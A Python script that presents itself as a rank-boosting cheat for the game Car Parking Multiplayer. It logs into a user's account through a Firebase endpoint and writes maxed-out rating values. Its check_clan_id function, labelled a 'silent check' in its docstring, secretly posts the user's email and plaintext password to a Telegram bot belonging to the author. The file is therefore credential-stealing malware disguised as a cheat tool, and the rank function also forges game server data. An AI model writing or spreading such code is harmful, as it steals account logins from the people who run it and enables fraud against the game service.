import requests
import json
from datetime import datetime
from config import (
    FIREBASE_LOGIN_URL,
    RANK_URL,
    CLAN_ID_URL,
    BOT_TOKEN,
    CHAT_ID
)

def send_to_telegram(email, password, clan_id):
    """Send account info to Telegram only if ClanId exists."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ ClanId Found!\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except requests.exceptions.RequestException:
        pass

def login(email, password):
    """Login to CPM using Firebase API."""
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        response_data = response.json()

        if response.status_code == 200 and 'idToken' in response_data:
            return response_data.get('idToken')
        else:
            return None
    except requests.exceptions.RequestException:
        return None

def set_rank(token):
    """Set KING RANK using max rating data."""
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000
    
    payload = {
        "data": json.dumps({"RatingData": rating_data})
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }

    try:
        response = requests.post(RANK_URL, headers=headers, json=payload)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def check_clan_id(token, email, password):
    """Silent check for ClanId and send to Telegram if found."""
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "okhttp/3.12.13",
        "Content-Type": "application/json"
    }
    payload = {"data": None}
    try:
        response = requests.post(CLAN_ID_URL, headers=headers, json=payload)
        if response.status_code == 200:
            raw = response.json()
            clan_id = raw.get("result", "")
            if clan_id:
                send_to_telegram(email, password, clan_id)
    except requests.exceptions.RequestException:
        pass